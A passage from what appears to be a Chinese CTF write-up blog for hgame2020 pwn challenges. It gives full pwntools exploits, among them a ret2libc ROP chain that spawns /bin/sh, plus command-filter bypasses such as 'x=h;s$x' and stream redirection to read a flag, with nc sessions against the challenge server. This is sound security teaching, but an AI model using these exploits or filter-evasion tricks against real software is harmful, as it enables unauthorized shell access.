:p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x00000000004008a3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'name?\n'</span>)</span><br><span class="line">sl(<span class="string">'a'</span>*<span class="number">31</span>)</span><br><span class="line">ru(<span class="string">'shot!\n'</span>)</span><br><span class="line">sl(str(<span class="number">0x6010e0</span><span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h3><ul><li>题目描述：ROP is PWNers’ romance</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_4/ROP_LEVEL0" target="_blank" rel="noopener">ROP_LEVEL0</a></li><li>考察点：ROP攻击</li><li>难度：简单</li><li>分值：150 </li><li>完成人数：88</li></ul><p><code>ROP</code>攻击的入门级别题目，非常适合新手学习。反汇编分析程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">open</span>(<span class="string">"./some_life_experience"</span>, <span class="number">0</span>);</span><br><span class="line">  *fd = v3;</span><br><span class="line">  <span class="built_in">read</span>(v3, &amp;buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>很明显的栈溢出，由于开了<code>ASLR</code>地址随机化保护，因此需要构造两个<code>ROP</code>链，第一个<code>ROP</code>链泄漏<code>libc</code>地址，第二个<code>ROP</code>用于 <code>ret2libc</code>，执行<code>system(&quot;/bin/sh&quot;)</code>获取shell。</p><p>至于<code>ROP</code>攻击，是比较基础的知识点，百度一下就能明白，这里就不赘述啦~</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./ROP_LEVEL0'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400753</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ppr = <span class="number">0x0000000000400750</span> <span class="comment"># pop r14 ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">88</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'./flag\n'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">puts = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">info_addr(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh'</span>).next() + libc_base</span><br><span class="line">info_addr(<span class="string">'system'</span>, system)</span><br><span class="line">info_addr(<span class="string">'binsh'</span>, binsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop2</span></span><br><span class="line">payload2 = <span class="string">'B'</span>*offset</span><br><span class="line">payload2 += p64(ppr) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)</span><br><span class="line">ru(<span class="string">'./flag\n'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><p>week2就有意思多了，各种预期解法和非预期解法都有…</p><p>Pwn本该这样，不该只有一种解法，思路灵活些总是没错的…</p><h3 id="findyourself"><a href="#findyourself" class="headerlink" title="findyourself"></a>findyourself</h3><ul><li>题目描述：baby题有两种，这是第一种，虽然这题名字没有baby</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_1/fys" target="_blank" rel="noopener">findyourself</a></li><li>考察点：proc、shell基础、ls命令(非预期)</li><li>难度：中等</li><li>分值：150</li><li>完成人数：37</li></ul><h4 id="0x0-程序分析"><a href="#0x0-程序分析" class="headerlink" title="0x0 程序分析"></a>0x0 程序分析</h4><p>面函数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  getcwd(&amp;buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"where are you?"</span>);</span><br><span class="line">  read_n(&amp;s1, <span class="number">64u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, &amp;buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nonono,not there"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read_n(&amp;s1, <span class="number">20u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check2(&amp;s1) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"oh,it's not good idea"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">  system(&amp;s1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>init</code>函数:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rand_pos; <span class="comment">// [rsp+4h] [rbp-51Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-518h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-514h]</span></span><br><span class="line">  <span class="keyword">int</span> buf[<span class="number">52</span>]; <span class="comment">// [rsp+10h] [rbp-510h]</span></span><br><span class="line">  <span class="keyword">char</span> dir_list[<span class="number">1008</span>]; <span class="comment">// [rsp+E0h] [rbp-440h]</span></span><br><span class="line">  <span class="keyword">char</span> new_dir; <span class="comment">// [rsp+4D0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+4F0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+518h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  rand_pos = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;rand_pos, <span class="number">1u</span>LL);</span><br><span class="line">  rand_pos %= <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  chdir(<span class="string">"./tmp"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;buf[i], <span class="number">4u</span>LL);</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;dir_list[<span class="number">20</span> * i], <span class="number">0x14</span>uLL, <span class="string">"0x%x"</span>, buf[i]);</span><br><span class="line">    <span class="built_in">mkdir</span>(&amp;dir_list[<span class="number">20</span> * i], <span class="number">0x1ED</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;new_dir, <span class="number">0x16</span>uLL, <span class="string">"./%s"</span>, &amp;dir_list[<span class="number">20</span> * rand_pos]);</span><br><span class="line">  chdir(&amp;new_dir);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"find yourself"</span>);</span><br><span class="line">  read_n(&amp;command, <span class="number">25u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check1(&amp;command) != <span class="number">-1</span> )</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>程序流程：</p><ul><li>在/tmp/目录下创建50个文件夹，文件名随机，然后随机切换到一个文件夹中</li><li>一次执行<code>system(cmd1)</code>的机会，字符过滤规则为<code>check1</code></li><li>随后，要输入正确的工作目录</li><li>又有一次执行<code>system(cmd2)</code>的机会，字符过滤规则为<code>check2</code></li><li>但是这次执行<code>system</code>前关闭了<code>stdout</code>和<code>stderr</code></li></ul><h4 id="0x1-check1"><a href="#0x1-check1" class="headerlink" title="0x1 check1"></a>0x1 check1</h4><ul><li>允许的字符： <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a b c d e f g h i j k l m n o p q r s t u v w x y z</span><br><span class="line">A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">/   -</span><br></pre></td></tr></table></figure></div></li><li>过滤的字符串 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sh</span><br><span class="line">cat</span><br><span class="line">flag</span><br><span class="line">pwd</span><br><span class="line"><span class="keyword">export</span></span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p>docker中能利用的命令不多，除了被过滤的<code>cat</code> 和<code>sh</code>之外，还有 <code>ls</code> 和<code>cd</code></p></li><li><p><code>cd -</code>可以输出<code>OLD_PWD</code>，也就是<code>/</code>，但是并无有神马用处</p></li><li><p><code>ls</code>可以虽然可以输出当前路径下的文件名，但是题目中对比的是绝对路径</p></li><li><p>看了下<code>ls --help</code>，发现可以利用<code>ls -ali</code>，输出当前目录文件<code>.</code>的<code>inode</code>，记做<code>inodeX</code>好啦</p></li><li><p><code>inode</code>是唯一的，于是再开一个<code>shell</code>，<code>ls -alh /tmp</code>查看<code>/tmp/</code>下的所有文件名及<code>inode</code></p></li><li><p>根据<code>inodeX</code>，即可找到正确的目录名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell 1</span></span><br><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21000</span></span><br><span class="line">find yourself</span><br><span class="line">ls -ali</span><br><span class="line">total 8</span><br><span class="line">1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .</span><br><span class="line">1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..</span><br><span class="line">where are you?</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell 2</span></span><br><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21000 | grep 1968846</span></span><br><span class="line">ls -ali /tmp</span><br><span class="line">1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 0x8eb79f31</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> shell 1</span></span><br><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21000</span></span><br><span class="line">find yourself</span><br><span class="line">ls -ali</span><br><span class="line">total 8</span><br><span class="line">1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .</span><br><span class="line">1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..</span><br><span class="line">where are you?</span><br><span class="line">/tmp/0x8eb79f31</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="0x2-check2"><a href="#0x2-check2" class="headerlink" title="0x2 check2"></a>0x2 check2</h4><ul><li><p>过滤的字符(串)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh cat * &amp; | &gt; &lt;</span><br></pre></td></tr></table></figure></div></li><li><p>这个简单多了，字符串拼接即可绕过</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=h;s$x</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="0x3-close-1-and-close-2"><a href="#0x3-close-1-and-close-2" class="headerlink" title="0x3 close(1) and close(2)"></a>0x3 close(1) and close(2)</h4><ul><li><p>关闭了<code>stdout</code>和<code>stderr</code>，即使<code>cat flag</code>也得不到输出<code>u_u</code></p></li><li><p>于是，重定向，把<code>stdout</code>和<code>stderr</code>重定向到<code>stdin</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="0x4-fini"><a href="#0x4-fini" class="headerlink" title="0x4 fini"></a>0x4 fini</h4><ul><li>这题在<code>check1</code>卡了好久，第三天才想到<code>ls -i</code>，我太菜了。</li></ul><h4 id="0x5-exp"><a href="#0x5-exp" class="headerlink" title="0x5 exp"></a>0x5 exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./fys'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      